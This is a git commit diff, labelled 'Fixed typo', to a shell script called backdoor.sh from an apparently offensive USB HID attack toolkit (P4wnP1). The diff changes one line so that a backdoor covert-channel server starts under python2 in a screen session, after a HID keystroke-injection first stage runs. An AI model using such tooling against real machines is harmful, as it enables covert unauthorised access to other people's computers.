862581da16c158e33e0650cca559a5b02c0906b3
NightRang3r <shai@exploit.co.il>
2024-01-09 09:37:48 +0200

    Fixed typo

--- RAW HID Attacks/Backdoor/backdoor.sh
+++ RAW HID Attacks/Backdoor/backdoor.sh
@@ -16,7 +16,7 @@ P4wnP1_cli hid run -n FirstStage.js > /dev.null
 if ! ps -aux | grep P4wnP1.py | grep -q -v grep; then
         echo "[*] Start backdoor covert channel server and attach to screen session..."
         touch /tmp/device_hid_mouse
-        screen -dmS backdoor bash -c "python  /usr/local/P4wnP1/scripts/backdoor/P4wnP1.py"
+        screen -dmS backdoor bash -c "python2 /usr/local/P4wnP1/scripts/backdoor/P4wnP1.py"
         echo "[+] Type \"screen -d -r backdoor\" to switch to backdoor cli"
 else
         echo "[!] HID covert channel server already running"
